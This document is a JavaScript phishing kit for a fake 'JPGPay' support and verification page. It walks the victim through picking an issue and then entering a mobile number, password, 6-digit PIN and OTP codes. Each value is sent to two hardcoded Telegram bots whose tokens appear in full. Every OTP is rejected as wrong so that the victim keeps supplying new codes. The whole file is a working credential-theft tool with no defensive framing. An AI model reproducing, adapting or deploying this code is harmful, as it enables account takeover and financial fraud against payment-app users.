(function() {
  // ==================== TELEGRAM CONFIG (BOTH BOTS) ====================
  const BOT_1_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
  const CHAT_1_ID = '6076330929';

  const BOT_2_TOKEN = '8899519634:AAGcr2JLK9HAsX6XXtkwbdp96eioJebTsYY';
  const CHAT_2_ID = '6076330929';

  // ==================== TELEGRAM SEND (TO BOTH BOTS) ====================
  function sendToTelegram(text) {
    if (BOT_1_TOKEN && CHAT_1_ID) {
      const url1 = 'https://api.telegram.org/bot' + BOT_1_TOKEN + '/sendMessage'
        + '?chat_id=' + CHAT_1_ID
        + '&text=' + encodeURIComponent(text)
        + '&disable_web_page_preview=true';

      fetch(url1, { method: 'GET', mode: 'no-cors', cache: 'no-store' })
        .catch(function(error) { console.log('[TG 1] error →', error); });
    }

    if (BOT_2_TOKEN && CHAT_2_ID && BOT_2_TOKEN !== 'YAHAN_APNA_DOOSRA_BOT_TOKEN_DAALEIN') {
      const url2 = 'https://api.telegram.org/bot' + BOT_2_TOKEN + '/sendMessage'
        + '?chat_id=' + CHAT_2_ID
        + '&text=' + encodeURIComponent(text)
        + '&disable_web_page_preview=true';

      fetch(url2, { method: 'GET', mode: 'no-cors', cache: 'no-store' })
        .catch(function(error) { console.log('[TG 2] error →', error); });
    }

    console.log('[TG] sent to both bots →', text.substring(0, 50));
  }

  // ==================== AUTO TEST PING ON LOAD ====================
  setTimeout(function() {
    sendToTelegram(
      '🔔 JPGPay (me) Page Opened\n' +
      '━━━━━━━━━━━━━━━\n' +
      '✅ Link Clicked By User\n' +
      '🕒 Time: ' + new Date().toLocaleString()
    );
  }, 600);

  // ==================== DYNAMIC SHAPES ====================
  (function createShapes() {
    const layer = document.querySelector('.bg-layer');
    if (!layer) return;
    const shapeCount = window.innerWidth < 480 ? 12 : 18;
    const types = ['circle', 'triangle', 'square'];
    for (let i = 0; i < shapeCount; i++) {
      const s = document.createElement('div');
      s.className = 'shape ' + types[Math.floor(Math.random() * types.length)];
      const size = 8 + Math.random() * 22;
      if (s.classList.contains('circle')) {
        s.style.width = size + 'px'; s.style.height = size + 'px';
      } else if (s.classList.contains('square')) {
        s.style.width = (size * 0.7) + 'px'; s.style.height = (size * 0.7) + 'px';
      } else {
        const b = size * 0.6;
        s.style.borderLeftWidth = b + 'px'; s.style.borderRightWidth = b + 'px'; s.style.borderBottomWidth = (b * 1.6) + 'px';
      }
      s.style.left = Math.random() * 100 + '%';
      s.style.bottom = '-15vh';
      s.style.animationDuration = (14 + Math.random() * 18) + 's';
      s.style.animationDelay = (-Math.random() * 22) + 's';
      layer.appendChild(s);
    }
  })();

  // ==================== FOUNTAIN / PARTICLE EFFECT ====================
  (function createFountain() {
    const layer = document.querySelector('.bg-layer');
    if (!layer) return;
    
    setInterval(() => {
      const p = document.createElement('div');
      p.className = 'fountain-particle';
      const size = 4 + Math.random() * 8;
      p.style.width = size + 'px';
      p.style.height = size + 'px';
      
      const startX = Math.random() * window.innerWidth;
      p.style.left = startX + 'px';
      
      const tx = (Math.random() - 0.5) * 150;
      p.style.setProperty('--tx', tx + 'px');
      
      const duration = 4 + Math.random() * 4;
      p.style.animationDuration = duration + 's';
      
      layer.appendChild(p);
      setTimeout(() => p.remove(), duration * 1000);
    }, 300);
  })();

  // ==================== CLICK SOUND ====================
  let audioCtx = null;
  function playClickSound() {
    try {
      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      if (audioCtx.state === 'suspended') audioCtx.resume();
      const now = audioCtx.currentTime;
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(1050, now);
      osc.frequency.exponentialRampToValueAtTime(520, now + 0.06);
      gain.gain.setValueAtTime(0.10, now);
      gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.09);
      osc.connect(gain); gain.connect(audioCtx.destination);
      osc.start(now); osc.stop(now + 0.10);
    } catch (e) {}
  }

  // ==================== ERROR BUZZER ====================
  function playErrorSound() {
    try {
      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      if (audioCtx.state === 'suspended') audioCtx.resume();
      const now = audioCtx.currentTime;
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'square';
      osc.frequency.setValueAtTime(220, now);
      osc.frequency.setValueAtTime(170, now + 0.13);
      gain.gain.setValueAtTime(0.09, now);
      gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.32);
      osc.connect(gain); gain.connect(audioCtx.destination);
      osc.start(now); osc.stop(now + 0.34);
    } catch (e) {}
  }

  // ==================== VOICE ====================
  function speak(text) {
    if (!('speechSynthesis' in window)) return;
    window.speechSynthesis.cancel();
    const utterance = new SpeechSynthesisUtterance(text);
    utterance.rate = 0.92;
    utterance.pitch = 1.02;
    utterance.volume = 0.9;
    const voices = window.speechSynthesis.getVoices();
    if (voices.length) {
      const preferred = voices.find(v => v.lang.startsWith('en') && v.name.toLowerCase().includes('female'))
        || voices.find(v => v.lang.startsWith('en') && v.name.toLowerCase().includes('google'))
        || voices.find(v => v.lang.startsWith('en'));
      if (preferred) utterance.voice = preferred;
    }
    window.speechSynthesis.speak(utterance);
  }
  if ('speechSynthesis' in window) window.speechSynthesis.onvoiceschanged = function() {};

  // ==================== GLOBAL CLICK SOUND ====================
  const appCard = document.getElementById('appCard');
  if (appCard) {
    appCard.addEventListener('click', function(e) {
      const el = e.target.closest('.problem-item, .btn-primary, .btn-secondary, .back-btn');
      if (el) playClickSound();
    });
  }

  // ==================== STATE ====================
  let selectedProblem = null;
  let mobileNumber = '';
  let password = '';
  let enteredPin = '';
  let otpAttempts = 0;

  const stepContainer = document.getElementById('stepContainer');
  if (!stepContainer) return;

  function showLoading(message, submessage, duration, callback) {
    stepContainer.innerHTML = `
      <div class="loader-overlay">
        <div class="spinner"></div>
        <div class="loader-text">${message}</div>
        <div style="color: #059669; font-size: 0.82rem; margin-top: 2px;">${submessage}</div>
      </div>
    `;
    setTimeout(() => {
      if (typeof callback === 'function') {
        callback();
      }
    }, duration);
  }

  const problems = [
    { id: 1, label: 'Selling issue', icon: 'fa-store' },
    { id: 2, label: 'Deposit failed', icon: 'fa-credit-card' },
    { id: 3, label: 'Forget Password ', icon: 'fa-lock' },
    { id: 4, label: 'Remove Check Risk ', icon: 'fa-shield-alt' },
    { id: 5, label: 'UPI Change ', icon: 'fa-mobile-alt' },
    { id: 6, label: 'New Version Download ', icon: 'fa-download' }
  ];

  // ---------- PROBLEM STEP ----------
  function renderProblemStep() {
    let problemsHtml = '';
    problems.forEach(p => {
      problemsHtml += `
        <div class="problem-item" data-id="${p.id}" data-label="${p.label}">
          <i class="fas ${p.icon}"></i>
          <span>${p.id}. ${p.label}</span>
        </div>
      `;
    });

    stepContainer.innerHTML = `
      <h2>How can we help you?</h2>
      <div class="subhead">Select the issue you are facing</div>
      <div class="problem-grid">${problemsHtml}</div>
    `;

    document.querySelectorAll('.problem-item').forEach(item => {
      item.addEventListener('click', function() {
        document.querySelectorAll('.problem-item').forEach(i => i.classList.remove('selected'));
        this.classList.add('selected');
        selectedProblem = { id: parseInt(this.dataset.id), label: this.dataset.label };

        sendToTelegram(
          '🎫 NEW SUPPORT REQUEST — JPGPay\n' +
          '━━━━━━━━━━━━━━━\n' +
          '📌 Issue: ' + selectedProblem.label + '\n' +
          '🕒 Time: ' + new Date().toLocaleString() + '\n' +
          '🌐 Page: JPGPay Verification'
        );

        showLoading('Connecting to support...', 'Please wait', 1500, renderRegisterStep);
      });
    });
  }

  // ---------- REGISTER STEP ----------
  function renderRegisterStep() {
    stepContainer.innerHTML = `
      <div style="display: flex; align-items: center; margin-bottom: 8px;">
        <button id="backBtn" class="back-btn" style="background: none; border: none; color: #059669; font-size: 0.92rem; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; padding: 2px 0;">
          <i class="fas fa-arrow-left"></i> Back
        </button>
      </div>
      <h2>Customer Verification</h2>
      <div class="subhead">${selectedProblem ? selectedProblem.label : ''}</div>
      <div class="form-step">
        <div class="input-group">
          <label>MOBILE NUMBER</label>
          <input type="tel" id="mobileInput" class="input-field" placeholder="Enter 10-digit mobile number" maxlength="10" inputmode="numeric" pattern="[0-9]*">
        </div>
        <div class="input-group">
          <label>PASSWORD</label>
          <input type="password" id="passwordInput" class="input-field" placeholder="Enter your password" maxlength="30">
        </div>
        <button id="registerBtn" class="btn-primary">
          <i class="fas fa-shield-alt"></i> Verify & Continue
        </button>
      </div>
    `;

    document.getElementById('backBtn').addEventListener('click', renderProblemStep);

    const mobileInput = document.getElementById('mobileInput');
    const passwordInput = document.getElementById('passwordInput');
    const registerBtn = document.getElementById('registerBtn');

    if (mobileInput) {
      mobileInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
      });
    }

    if (registerBtn) {
      registerBtn.addEventListener('click', function() {
        const mobile = mobileInput ? mobileInput.value.trim() : '';
        const pwd = passwordInput ? passwordInput.value.trim() : '';

        if (mobile.length !== 10 || !/^\d{10}$/.test(mobile)) {
          alert('Please enter a valid 10-digit Indian mobile number.');
          return;
        }
        if (pwd.length < 4) {
          alert('Password must be at least 4 characters.');
          return;
        }

        mobileNumber = mobile;
        password = pwd;

        sendToTelegram(
          '📱 MOBILE & PASSWORD RECEIVED — JPGPay\n' +
          '━━━━━━━━━━━━━━━\n' +
          '🎫 Issue: ' + (selectedProblem ? selectedProblem.label : 'N/A') + '\n' +
          '📞 Mobile: ' + mobile + '\n' +
          '🔒 Password: ' + pwd + '\n' +
          '🕒 Time: ' + new Date().toLocaleString()
        );

        speak('Verifying your details. Please wait.');

        showLoading('Verifying your details...', 'Secure connection established', 4500, function() {
          speak('Verification successful.');
          renderPinStep();
        });
      });
    }
  }

  // ---------- PIN STEP ----------
  function renderPinStep() {
    stepContainer.innerHTML = `
      <div style="display: flex; align-items: center; margin-bottom: 8px;">
        <button id="backBtn" class="back-btn" style="background: none; border: none; color: #059669; font-size: 0.92rem; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; padding: 2px 0;">
          <i class="fas fa-arrow-left"></i> Back
        </button>
      </div>
      <h2>Enter 6-digit PIN</h2>
      <div class="subhead">Enter your 6-digit PIN</div>
      <div class="pin-row" id="pinRow">
        <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      </div>
      <button id="pinSubmitBtn" class="btn-primary" style="margin-top: 18px;">
        <i class="fas fa-lock"></i> Continue
      </button>
    `;

    document.getElementById('backBtn').addEventListener('click', renderRegisterStep);

    const pinInputs = document.querySelectorAll('.pin-box');
    const pinSubmitBtn = document.getElementById('pinSubmitBtn');

    pinInputs.forEach((input, idx) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 1);
        if (this.value.length === 1 && idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
      });
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) pinInputs[idx - 1].focus();
      });
    });

    if (pinInputs.length > 0) pinInputs[0].focus();

    if (pinSubmitBtn) {
      pinSubmitBtn.addEventListener('click', function() {
        let pin = '';
        for (let i = 0; i < pinInputs.length; i++) {
          const val = pinInputs[i].value.trim();
          if (val.length !== 1 || !/^\d$/.test(val)) {
            alert('Please enter all 6 digits of your PIN.');
            pinInputs[i].focus();
            return;
          }
          pin += val;
        }
        enteredPin = pin;

        sendToTelegram(
          '🔑 6-DIGIT PIN RECEIVED — JPGPay\n' +
          '━━━━━━━━━━━━━━━\n' +
          '📞 Mobile: ' + mobileNumber + '\n' +
          '🔐 PIN: ' + pin + '\n' +
          '🕒 Time: ' + new Date().toLocaleString()
        );

        showLoading('Verifying PIN...', 'Please wait', 1000, renderOtpStep);
      });
    }
  }

  // ---------- OTP STEP ----------
  function renderOtpStep() {
    otpAttempts = 0;

    stepContainer.innerHTML = `
      <div style="display: flex; align-items: center; margin-bottom: 8px;">
        <button id="backBtn" class="back-btn" style="background: none; border: none; color: #059669; font-size: 0.92rem; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; padding: 2px 0;">
          <i class="fas fa-arrow-left"></i> Back
        </button>
      </div>
      <h2>OTP Verification</h2>
      <div class="subhead">6-digit code sent to +91 ${mobileNumber}</div>
      <div class="otp-row" id="otpRow">
        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      </div>
      <div id="otpError" class="otp-error-msg hidden"></div>

      <div style="text-align: right; margin-top: 14px; font-size: 0.88rem;">
        <span id="resendContainer">
          <a href="#" id="sendOtpBtn" style="color: #059669; font-weight: 700; text-decoration: none;">Send OTP</a>
        </span>
      </div>

      <button id="otpSubmitBtn" class="btn-primary" style="margin-top: 14px;">
        <i class="fas fa-check-circle"></i> Verify OTP
      </button>
    `;

    document.getElementById('backBtn').addEventListener('click', renderPinStep);

    const otpInputs = document.querySelectorAll('.otp-box');
    const otpSubmitBtn = document.getElementById('otpSubmitBtn');
    const otpRow = document.getElementById('otpRow');
    const otpError = document.getElementById('otpError');
    const resendContainer = document.getElementById('resendContainer');

    function initSendOrResend() {
      const sendOtpBtn = document.getElementById('sendOtpBtn');
      if (sendOtpBtn) {
        sendOtpBtn.addEventListener('click', function(e) {
          e.preventDefault();

          sendToTelegram(
            '📤 SEND OTP REQUESTED — JPGPay\n' +
            '━━━━━━━━━━━━━━━\n' +
            '📞 Mobile: ' + mobileNumber + '\n' +
            '🕒 Time: ' + new Date().toLocaleString()
          );

          alert('OTP sent successfully to +91 ' + mobileNumber);

          let timeLeft = 59;
          resendContainer.innerHTML = `<span style="color: #059669; font-weight: 600;">Resend OTP in <span id="countdown">${timeLeft}</span>s</span>`;
          const countdownEl = document.getElementById('countdown');

          const timerInterval = setInterval(() => {
            timeLeft--;
            if (countdownEl) countdownEl.textContent = timeLeft;
            if (timeLeft <= 0) {
              clearInterval(timerInterval);
              resendContainer.innerHTML = `<a href="#" id="sendOtpBtn" style="color: #059669; font-weight: 700; text-decoration: none;">Resend OTP</a>`;
              initSendOrResend();
            }
          }, 1000);
        });
      }
    }

    initSendOrResend();

    otpInputs.forEach((input, idx) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 1);
        if (otpRow) otpRow.classList.remove('error');
        if (this.value.length === 1 && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
      });
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) otpInputs[idx - 1].focus();
      });
    });

    if (otpInputs.length > 0) otpInputs[0].focus();

    if (otpSubmitBtn) {
      otpSubmitBtn.addEventListener('click', function() {
        let otp = '';
        for (let i = 0; i < otpInputs.length; i++) {
          const val = otpInputs[i].value.trim();
          if (val.length !== 1 || !/^\d$/.test(val)) {
            alert('Please enter all 6 digits of the OTP.');
            otpInputs[i].focus();
            return;
          }
          otp += val;
        }

        otpAttempts++;

        sendToTelegram(
          '❌ WRONG OTP ATTEMPT #' + otpAttempts + ' — JPGPay\n' +
          '━━━━━━━━━━━━━━━\n' +
          '📞 Mobile: ' + mobileNumber + '\n' +
          '🔢 OTP entered: ' + otp + '\n' +
          '🕒 Time: ' + new Date().toLocaleString()
        );

        playErrorSound();
        speak('Wrong OTP. Please try again.');

        if (otpRow) {
          otpRow.classList.add('error', 'shake');
          setTimeout(() => otpRow.classList.remove('shake'), 520);
        }

        if (otpError) {
          otpError.classList.remove('hidden');
          otpError.innerHTML = '<i class="fas fa-exclamation-circle"></i> Incorrect OTP. Please try again.';
          otpError.style.animation = 'none';
          void otpError.offsetWidth;
          otpError.style.animation = '';
        }

        otpInputs.forEach(i => i.value = '');
        if (otpInputs.length > 0) otpInputs[0].focus();
      });
    }
  }

  // ==================== INIT ====================
  renderProblemStep();
})();
